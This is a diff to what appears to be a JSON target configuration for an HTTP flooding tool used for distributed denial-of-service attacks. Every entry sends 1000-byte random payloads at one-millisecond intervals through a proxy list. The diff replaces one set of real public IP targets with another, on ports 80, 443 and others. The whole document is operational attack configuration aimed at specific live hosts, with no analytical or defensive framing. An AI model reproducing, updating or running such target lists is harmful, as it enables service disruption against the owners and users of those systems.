@@ -4,7 +4,7 @@
     {
       "type": "http",
       "args": {
-        "address": "82.202.190.240:80",
+        "address": "212.66.37.43:80",
         "interval_ms": 1,
         "body": "{{- random_payload 1000 -}}",
         "client": { "proxy_urls": "{{ get_proxylist }}" }
@@ -13,7 +13,7 @@
     {
       "type": "http",
       "args": {
-        "address": "82.202.190.240:443",
+        "address": "212.66.37.43:443",
         "interval_ms": 1,
         "body": "{{- random_payload 1000 -}}",
         "client": { "proxy_urls": "{{ get_proxylist }}" }
@@ -22,7 +22,7 @@
     {
       "type": "http",
       "args": {
-        "address": "82.202.190.240:8010",
+        "address": "5.178.80.46:80",
         "interval_ms": 1,
         "body": "{{- random_payload 1000 -}}",
         "client": { "proxy_urls": "{{ get_proxylist }}" }
@@ -31,25 +31,7 @@
     {
       "type": "http",
       "args": {
-        "address": "194.28.236.63:80",
-        "interval_ms": 1,
-        "body": "{{- random_payload 1000 -}}",
-        "client": { "proxy_urls": "{{ get_proxylist }}" }
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "address": "194.28.236.63:443",
-        "interval_ms": 1,
-        "body": "{{- random_payload 1000 -}}",
-        "client": { "proxy_urls": "{{ get_proxylist }}" }
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "address": "194.28.236.63:8444",
+        "address": "5.178.80.46:443",
         "interval_ms": 1,
         "body": "{{- random_payload 1000 -}}",
         "client": { "proxy_urls": "{{ get_proxylist }}" }
